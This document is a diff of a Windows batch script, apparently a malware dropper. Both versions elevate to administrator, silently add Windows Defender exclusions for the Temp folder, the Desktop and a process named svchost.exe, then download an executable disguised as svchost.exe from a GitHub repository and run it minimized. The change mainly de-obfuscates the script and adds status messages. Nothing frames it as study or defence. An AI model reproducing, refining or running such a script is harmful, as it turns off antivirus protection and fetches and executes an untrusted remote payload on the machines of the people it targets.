@@ -1,47 +1,61 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Variables
-set "a=Add-MpPreference"
-set "b=ExclusionPath"
-set "c=ExclusionProcess"
-set "d=svchost.exe"
-set "e=C:\Users\%username%\AppData\Roaming\Temp"
-set "f=C:\Users\%username%\AppData\Roaming\Temp\%d%"
-set "g=C:\Users\%username%\Desktop"
-set "h=https://github.com/bouncegame/svchost/raw/refs/heads/main/%d%"
-
 :: Check if running as administrator
 openfiles > nul 2>&1
 if %errorlevel%==0 (
     goto :run_script
 ) else (
+    echo Requesting administrative privileges...
     powershell -Command "Start-Process -FilePath '%~dp0%~nx0' -Verb RunAs"
     exit
 )
 
 :run_script
+echo Adding Defender exclusions...
+
 :: Add Defender exclusions
-powershell -WindowStyle Hidden -Command ^
- "& { ^
-     $a = 'Add-MpPreference'; ^
-     $b = 'ExclusionPath'; ^
-     $c = 'ExclusionProcess'; ^
-     $d = '%d%'; ^
-     $e = '%e%'; ^
-     $f = '%f%'; ^
-     $g = '%g%'; ^
-     Invoke-Expression \"$a -%b '%e%' -ErrorAction SilentlyContinue\"; ^
-     Invoke-Expression \"$a -%b '%f%' -ErrorAction SilentlyContinue\"; ^
-     Invoke-Expression \"$a -%c '%d%' -ErrorAction SilentlyContinue\"; ^
-     Invoke-Expression \"$a -%b '%g%' -ErrorAction SilentlyContinue\"; ^
- }"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp' -ErrorAction SilentlyContinue"
+if %errorlevel%==0 (
+    echo Exclusion added for C:\Users\%username%\AppData\Roaming\Temp
+) else (
+    echo Error adding exclusion for C:\Users\%username%\AppData\Roaming\Temp
+)
 
-:: Download %d% from the specified URL
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%h%', '%g%\%d%')"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp\svchost.exe' -ErrorAction SilentlyContinue"
+if %errorlevel%==0 (
+    echo Exclusion added for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe
+) else (
+    echo Error adding exclusion for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe
+)
 
-:: Run %d% silently
-start "" /min "%g%\%d%"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
+if %errorlevel%==0 (
+    echo Exclusion added for svchost.exe process
+) else (
+    echo Error adding exclusion for svchost.exe process
+)
 
-:: Clean up (optional)
-:: del /q /f "%g%\%d%"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\Desktop' -ErrorAction SilentlyContinue"
+if %errorlevel%==0 (
+    echo Exclusion added for C:\Users\%username%\Desktop
+) else (
+    echo Error adding exclusion for C:\Users\%username%\Desktop
+)
+
+echo Downloading svchost.exe...
+
+:: Download svchost.exe from the specified URL
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe', '%USERPROFILE%\Desktop\svchost.exe')"
+if %errorlevel%==0 (
+    echo svchost.exe downloaded successfully
+) else (
+    echo Error downloading svchost.exe
+)
+
+echo Running svchost.exe...
+
+:: Run svchost.exe silently
+start "" /min "%USERPROFILE%\Desktop\svchost.exe"
+
+echo Script completed.
